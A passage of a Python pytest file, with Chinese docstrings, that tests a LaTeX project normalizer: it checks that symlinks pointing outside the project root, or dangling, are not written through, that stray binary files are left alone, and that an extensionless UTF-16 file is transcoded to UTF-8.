    """软链命名的 aipcheck.tex 不覆写（写穿 = 改 root 外文件）。"""
    outside = tmp_path.parent / f"{tmp_path.name}-aip.tex"
    outside.write_bytes(b"\\typein{press}\n")
    try:
        (tmp_path / "aipcheck.tex").symlink_to(outside)
        (tmp_path / "main.tex").write_text(
            "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
        )
        stats = normalize_project(tmp_path, "xelatex", "main.tex")
        assert "junk_stubbed" not in stats
        assert outside.read_bytes() == b"\\typein{press}\n"
    finally:
        outside.unlink(missing_ok=True)


def test_shadow_dangling_symlink_target_skipped(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """遮蔽目标位已有悬挂软链 → 不写（exists()=False 但 write_text 会写穿）。"""
    proj = tmp_path / "proj"
    sysdir = tmp_path / "sys"
    proj.mkdir()
    sysdir.mkdir()
    bad = sysdir / "oldpkg.sty"
    bad.write_bytes(b"%% Copyright Schr\xf6der\n\\ProvidesPackage{oldpkg}\n")
    (proj / "main.tex").write_text(
        "\\documentclass{article}\n\\usepackage{oldpkg}\n"
        "\\begin{document}\nx\\end{document}\n"
    )
    (proj / "oldpkg.sty").symlink_to(tmp_path / "nowhere.sty")  # 悬挂
    monkeypatch.setattr(normalize.shutil, "which", lambda *_a: "/bin/kpsewhich")
    monkeypatch.setattr(
        normalize,
        "_kpse_resolve",
        lambda filename, *_a: bad if filename == "oldpkg.sty" else None,
    )
    stats = normalize_project(proj, "xelatex", "main.tex")
    assert "package_shadows" not in stats
    assert (proj / "oldpkg.sty").is_symlink()  # 未被覆写
    assert not (tmp_path / "nowhere.sty").exists()


def test_transcode_catchall_nul_binary_untouched(tmp_path: Path) -> None:
    """allowlist 漏网二进制（NUL 且非 UTF-16）→ 不动且不进 encodings 归因。"""
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    blob = b"\x00\x01\x02\xffBINARY\x00DATA"
    data = tmp_path / "payload.bin"
    data.write_bytes(blob)
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "transcoded_data" not in stats
    assert "payload.bin" not in stats.get("encodings", {})
    assert data.read_bytes() == blob


def test_transcode_extensionless_utf16_transcoded(tmp_path: Path) -> None:
    """无后缀 UTF-16（NUL 占比高但 utf-16 判定先行）→ 仍转码 UTF-8。"""
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    notes = tmp_path / "NOTES"
    notes.write_bytes("chécklist\n".encode("utf-16-le"))
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "NOTES" in stats["transcoded_data"]
    assert notes.read_text(encoding="utf-8") == "chécklist\n"
